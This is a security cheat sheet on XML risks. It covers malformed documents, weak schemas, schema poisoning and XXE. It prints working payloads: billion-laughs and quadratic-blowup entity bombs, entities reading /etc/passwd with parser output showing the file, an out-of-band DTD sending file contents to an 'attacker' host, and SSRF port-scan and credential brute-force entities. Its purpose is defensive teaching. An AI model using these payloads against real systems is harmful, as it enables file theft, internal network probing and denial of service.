# XML Security Cheat Sheet

## Introduction

XML and XML schema specs give tools to protect XML apps but also contain multiple security flaws. Exploitable for file retrieval, server side request forgery, port scanning, brute forcing. Sheet shows how attackers exploit XML in libraries/software via two attack surfaces:

- **Malformed XML Documents**: exploit vulnerabilities when apps meet XML documents not well-formed.
- **Invalid XML Documents**: exploit vulnerabilities when documents lack expected structure.

## Dealing with malformed XML documents

### Definition of a malformed XML document

Document not following W3C XML specification's well-formed definition = "malformed." **Malformed document → parser detects fatal error, should stop execution, document should get no further processing, app should display error message.** Malformed problems: missing ending tag, nonsensical element order, forbidden characters, etc.

### Handling malformed XML documents

**Use XML processor following W3C specifications that doesn't take significant additional time on malformed documents.** Also use only well-formed documents, validate contents of each element, process only valid values within predefined boundaries.

#### Malformed XML documents require extra time

**Malformed document may affect Central Processing Unit (CPU) consumption.** Sometimes processing malformed documents takes longer than well-formed ones → attacker exploits asymmetric resource consumption attack for Denial of Service (DoS).

**To assess likelihood, compare processing time of regular XML document vs malformed version of same document.** Then consider attacker combining this with XML flood attack using multiple documents to amplify effect.

### Applications Processing Malformed Data

**Some XML parsers can recover malformed documents.** Can be told to return best-effort valid tree with all parseable content regardless of spec noncompliance. **No predefined recovery rules → approach/results differ between parsers. Malformed documents may cause data integrity issues.**

Two scenarios illustrate attack vectors parser analyzes in recovery mode:

#### Malformed Document to Malformed Document

Per XML spec, string `--` (double-hyphen) must not occur within comments. In recovery mode of lxml and PHP, following document stays unchanged after recovery:

```xml
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>
```

#### Well-Formed Document to Well-Formed Document Normalized

Some parsers may normalize `CDATA` section contents: update special characters in `CDATA` to safe versions though not required:

```xml
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>
```

`CDATA` normalization not common among parsers. Libxml could transform document to canonical version; though well formed, contents may count as malformed depending on situation:

```xml
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>
```

### Handling coercive parsing

**Popular coercive attack: parse deeply nested XML documents without corresponding ending tags. Victim uses up (eventually depletes) machine resources → denial of service.** Firefox 3.67 DoS report used 30,000 open XML elements without ending tags. Removing closing tags simplified attack (needs only half the size of well-formed document for same results). Tag count eventually caused stack overflow. Simplified document:

```xml
<A1>
 <A2>
  <A3>
   ...
    <A30000>
```

## Violation of XML Specification Rules

Parsers not following W3C specs may give unexpected consequences. **Crashes and/or code execution possible when software doesn't properly handle incorrect XML structures. Feeding fuzzed XML documents may expose this.**

## Dealing with invalid XML documents

**Attackers introduce unexpected values, exploiting apps that don't verify document contains valid value set.** Schemas specify restrictions identifying validity; valid document = well formed + complies with schema restrictions. More than one schema can validate a document; restrictions may span multiple files, one schema language or mix of languages' strengths.

Recommendation: each XML document MUST have precisely defined XML Schema (not DTD) w/ every piece of info properly restricted against improper data validation. Use local copy or known good repository instead of schema reference supplied in XML document. Also integrity-check referenced XML schema file (repository could be compromised). Documents using remote schemas: configure servers to use only secure encrypted communications to prevent eavesdropping.

### Document without Schema

Bookseller uses web service via web interface for transactions. Transaction XML has two elements: `id` of an item and `price`. User may only enter certain `id` value via web interface:

```xml
<buy>
 <id>123</id>
 <price>10</price>
</buy>
```

**Without control on document structure, app could process other well-formed messages w/ unintended consequences. Document could contain additional tags affecting behavior of app processing it**:

```xml
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>
```

Value 123 supplied as `id`, but document includes additional opening/closing tags. Attacker closed `id` element, set bogus `price` element to 0. To keep structure well-formed, adds one empty `id` element. App then adds closing tag for `id` and sets `price` to 10. If app processes only first values for ID and value w/o any structure control, attacker can buy book without paying.

### Unrestrictive Schema

**Some schemas don't restrict data per element enough.** Normal w/ DTD; very limited set of possibilities vs restrictions applicable in XML documents. Exposes app to undesired values in elements/attributes easily constrained w/ other schema languages. Example: person's `age` validated against inline DTD schema:

```xml
<!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>
```

Document has inline DTD w/ root element `person`. Contains two elements in order: `name` then `age`. `name` defined as `PCDATA`, as is `age`.

Then well-formed valid XML document begins. Element name has irrelevant value but `age` has one million digits. No max size restriction on `age` → one-million-digit string can be sent to server.

Such element should be restricted to max characters and character set (e.g., digits 0 to 9, + sign, - sign). Not properly restricted → app may handle potentially invalid values.

Can't specify restrictions (max length for `name`, valid range for `age`) → this schema type raises risk to integrity and availability of resources.

### Improper Data Validation

**Insecurely defined schemas w/o strict rules expose app to diverse situations: disclosure of internal errors, or documents hitting app functionality with unexpected values.**

#### String Data Types

Needing hexadecimal value: pointless to define as string later restricted to 16 hexadecimal characters. Example: XML encryption requires some values base64 encoded. Schema definition of those values:

```xml
<element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>
```

Schema defines `CipherValue` as base64 data type. IBM WebSphere DataPower SOA Appliance allowed any characters in this element after valid base64 value and considered it valid.

First portion checked as base64, remaining characters could be anything (incl. other sub-elements of `CipherData`). Restrictions only partially set → info probably tested by application, not proposed sample schema.

#### Numeric Data Types

**Defining correct data type for numbers more complex; more options than strings.**

##### Negative and Positive Restrictions

XML Schema numeric types cover different ranges:

- **negativeInteger**: only negative numbers
- **nonNegativeInteger**: positive numbers and zero
- **positiveInteger**: only positive numbers
- **nonPositiveInteger**: negative numbers and zero

Sample document defines product `id`, `price`, `quantity` (attacker-controlled):

```xml
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>
```

**To avoid repeating old errors, define XML schema preventing processing of incorrect structure when attacker adds elements:**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

`quantity` limited to integer type avoids unexpected characters. App may compute final price `price*quantity`. **Data type may allow negative values → attacker's negative number gives negative result on user's account. Use positiveInteger instead of integer to avoid this logical vulnerability.**

##### Divide by Zero

**User-controlled denominators: avoid allowing zero. Division by zero in XSLT → error `FOAR0001`. Other apps may throw other exceptions, program may crash.** XML schema data types exist that exclude zero. E.g., negatives and zero invalid → schema can specify `positiveInteger` for element.

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>
```

`denominator` restricted to positive integers: only values greater than zero valid. Any other restriction type may trigger error on zero denominator.

##### Special Values: Infinity and Not a Number (NaN)

`float` and `double` hold real numbers plus special values: `-Infinity` or `-INF`, `NaN`, `+Infinity` or `INF`. Useful for some values but often misused, commonly to express only real numbers such as prices. Common error in other programming languages too, not limited to these technologies.

Ignoring full value spectrum of data type can make underlying apps fail. **Special values `Infinity` and `NaN` not required, only real numbers expected → use `decimal`:**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

**`price` set to Infinity or NaN triggers no errors, since those values invalid. Attacker can exploit if allowed.**

#### General Data Restrictions

After choosing data type, apply additional restrictions; sometimes only subset of data type's values valid:

##### Prefixed Values

**Some values restricted to specific sets: traffic lights have three colors, 12 months, etc. Schema can enforce per element/attribute. Perfect allow-list scenario: only specific values accepted. Constraint called `enumeration` in XML schema.** Example restricts month element to 12 possible values:

```xml
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

Limiting month element to those values → app doesn't handle random strings.

##### Ranges

Apps, databases, programming languages store info within specific ranges. **Where sizes matter (avoid overflows/underflows), check data length validity.** Schema constraining name w/ min and max length:

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

Possible values restricted to specific length (say 8):

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

##### Patterns

Elements/attributes may follow specific syntax. XML schemas allow `pattern` restrictions. **To ensure data complies w/ pattern, create specific definition. Social security numbers (SSN): specific character set, length, and `pattern`:**

```xml
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

Only numbers between `000-00-0000` and `999-99-9999` allowed for SSN.

##### Assertions

**Assertion components constrain existence/values of related elements and attributes. Element/attribute valid under assertion only if test evaluates true w/o error. Variable `$value` references contents of analyzed value.**

*Divide by Zero* section above covered consequences of zero-containing types for denominators, proposing positive-only type. Opposite example: valid range = all numbers except zero. To avoid disclosing errors, check w/ `assertion` disallowing zero:

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

Assertion guarantees `denominator` never zero; also allows negative denominators.

##### Occurrences

**Not defining max occurrences can be worse than consequences of receiving extreme item counts.** Two attributes set min/max limits: `minOccurs` and `maxOccurs`.

Default for both `minOccurs` and `maxOccurs` = `1`; some elements need other values. E.g., optional value: `minOccurs` 0; no max limit: `maxOccurs` `unbounded`, as in example:

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

Schema root element `operation` can contain unlimited (`unbounded`) buy elements. Common finding; developers normally don't want to restrict max occurrences. **Apps with limitless occurrences should test behavior on extremely large element counts. Computational resources limited → analyze consequences, eventually use max number instead of `unbounded`.**

### Jumbo Payloads

**Sending 1GB XML document needs only a second of server processing; may not merit consideration as attack. Attacker instead seeks to minimize CPU/traffic used to generate attack relative to total server CPU/traffic handling requests.**

#### Traditional Jumbo Payloads

**Two primary methods to enlarge document:**

**- Depth attack: huge number of elements, element names, and/or element values.**

**- Width attack: huge number of attributes, attribute names, and/or attribute values.**

Usually result = huge document. Short example:

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...
```

#### "Small" Jumbo Payloads

**Very small document, but processing results can match traditional jumbo payloads.** Small payload lets attacker send many documents fast enough to consume most/all available resources:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>
```

### Schema Poisoning

**Attacker able to modify schema → multiple high-risk consequences; more dangerous if schemas use DTD (e.g., file retrieval, denial of service).** Exploitable in numerous scenarios, depending on schema location.

#### Local Schema Poisoning

**Local schema poisoning: schemas on same host, embedded in same XML document or not.**

##### Embedded Schema

**Most trivial schema poisoning: schema defined within same XML document.** Unknowingly vulnerable W3C example:

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

All restrictions on note element could be removed/altered, allowing any data sent to server. If server processes external entities, attacker could use schema, e.g., to read remote files from server. **Such schema only suggests how to send document; must have way to check embedded schema integrity for safe use. Embedded schema attacks commonly exploit external entity expansions. Embedded XML schemas can also assist port scans of internal hosts or brute force attacks.**

##### Incorrect Permissions

**Processing local schema often circumvents risk of remotely tampered versions.**

```xml
<!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

**But local schema without correct permissions lets internal attacker alter original restrictions.** Schema with permissions letting any user modify:

```text
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
```

Permissions on `name.dtd` let any user on system modify. Not related to XML/schema structure, but these documents commonly sit in filesystem, so attacker could exploit this.

#### Remote Schema Poisoning

**Schemas defined by external organizations normally referenced remotely. Attacker able to divert/access network traffic can make victim fetch different content than intended.**

##### Man-in-the-Middle (MitM) Attack

Documents referencing remote schemas over unencrypted Hypertext Transfer Protocol (HTTP): plain text communication, easily tampered. **XML documents referencing remote schemas via HTTP: connection could be sniffed and modified before reaching end user:**

```xml
<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

Remote `note.dtd` susceptible to tampering over unencrypted HTTP. Tool facilitating this attack: mitmproxy.

##### DNS-Cache Poisoning

Domain Name System (DNS) cache poisoning can change IP returned by forward hostname lookup, redirecting schema connection. With HTTPS, client MUST also verify certificate against requested hostname. DNS redirection alone doesn't let attacker substitute schema content when verification succeeds.

Previous example referenced host `example.com` over unencrypted protocol.

Switching to HTTPS, remote schema location `https://example.com/note.dtd`. Suppose hostname lookup normally returns:

```bash
$ host example.com
example.com has address 1.1.1.1
```

Attacker compromising DNS: hostname may point to new attacker-controlled IP `2.2.2.2`:

```bash
$ host example.com
example.com has address 2.2.2.2
```

Redirected HTTPS connection must fail if attacker can't present certificate trusted for `example.com`. Content substitution needs additional failure: disabled certificate verification, compromised certificate trust chain, or compromised legitimate server credentials. Keep certificate and hostname verification enabled; stop schema retrieval on verification failure. HTTPS authenticates server; doesn't make schema safe if legitimate host compromised.

##### Evil Employee Attack

Third-party-hosted/defined schemas: contents outside users' control. **Modifications by malicious employee, or external attacker controlling files, could impact all users processing schemas. Attackers could then affect confidentiality, integrity, or availability of other services (especially if schema is DTD).**

### XML Entity Expansion

**If parser uses DTD, attacker might inject data adversely affecting parser during document processing: parser crash or local file access.

#### Sample Vulnerable Java Implementations

**DTD capabilities of referencing local/remote files can affect file confidentiality.** Also affects resource availability if no restrictions on entity expansion. Example XXE code.

**Sample XML**:

```xml
<!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>
```

**Sample DTD**:

```xml
<!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
```

##### XXE using DOM

```java
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
```

Output of previous code:

```bash
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE using DOM4J

```java
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

Output of previous code:

```bash
$ java test1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE contacts SYSTEM "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE using SAX

```java
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
```

Output of previous code:

```bash
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE using StAX

```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

```

Output of previous code:

```bash
$ java parseDocument
<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

#### Recursive Entity Reference

**Element `A` defined as element `B`, and `B` defined as `A` → schema describes circular reference between elements:**

```xml
<!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>
```

#### Quadratic Blowup

**Instead of multiple small deeply nested entities, attacker defines one very large entity, refers to it as many times as possible → quadratic expansion (*O(n^2)*).**

Attack below results in 100,000 x 100,000 characters in memory.

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
```

#### Billion Laughs

**Parser resolving external entities in code below consumes all available memory until process crashes.** Example XML document with embedded DTD schema including attack:

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```

`LOL9` resolves as 10 entities defined in `LOL8`; each resolves in `LOL7`, and so on. CPU and/or memory affected by parsing `3 x 10^9` (3,000,000,000) entities defined in schema; parser may crash.

**Simple Object Access Protocol (SOAP) specification forbids DTDs completely → SOAP processor can reject any SOAP message containing DTD. Despite this, some SOAP implementations parsed DTD schemas in SOAP messages.**

Example where parser doesn't follow spec, enabling DTD reference in SOAP message:

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>
```

#### Reflected File Retrieval

Example XXE code:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```

**XML defines entity `xxe` = contents of `/etc/passwd`, expanded within `includeme` tag. If parser allows external entity references, may include file contents in XML response or error output.**

#### Server Side Request Forgery

**Server Side Request Forgery (SSRF): server receives malicious XML schema, retrieves remote resources like file via HTTP/HTTPS/FTP, etc.** Used to retrieve remote files, prove XXE when file can't be reflected back, port scan, brute force internal networks.

##### External DNS Resolution

**Sometimes app can be induced to perform server-side DNS lookups of arbitrary domain names.** Simplest SSRF form, but attacker must analyze DNS traffic. Burp has plugin checking this attack.

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```

##### External Connection

XXE exists but file can't be retrieved → test whether remote connections can be established:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

##### File Retrieval with Parameter Entities

Parameter entities allow content retrieval via URL references. Malicious XML document:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```

DTD defines two external parameter entities: `file` loads local file, `dtd` loads remote DTD. Remote DTD should contain something like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```

Second DTD makes system send contents of `file` back to attacker's server as URL parameter.

##### Port Scanning

Amount/type of port scanning info depends on implementation. Response classes, easy to complex:

**1) Complete Disclosure**: simplest, most unusual; full responses from queried server visible. Exact representation of what happened connecting to remote host.

**2) Error-based**: remote response not visible → use info in error response. Web service leaking details in SOAP Fault element on connection attempt:

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```

**3) Timeout-based**: scanner may generate timeouts connecting to open or closed ports depending on schema and underlying implementation. Timeouts connecting to closed port (may take one minute); response from valid port very quick (one second, e.g.). Open/closed difference becomes clear.

**4) Time-based**: closed/open ports hard to tell apart when results subtle. Only certain way: multiple time measurements per host, analyze average time per port to determine status. Difficult in higher latency networks.

##### Brute Forcing

**Once port scan confirmed possible, brute force = embedding `username` and `password` in URI scheme (http, ftp, etc).** Example:

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```

## References

- W3C: Extensible Markup Language (XML) 1.0
- W3C: XML Schema Definition Language (XSD) 1.1, Part 2 — Datatypes
- Oracle Java 25: JAXP Security Guide
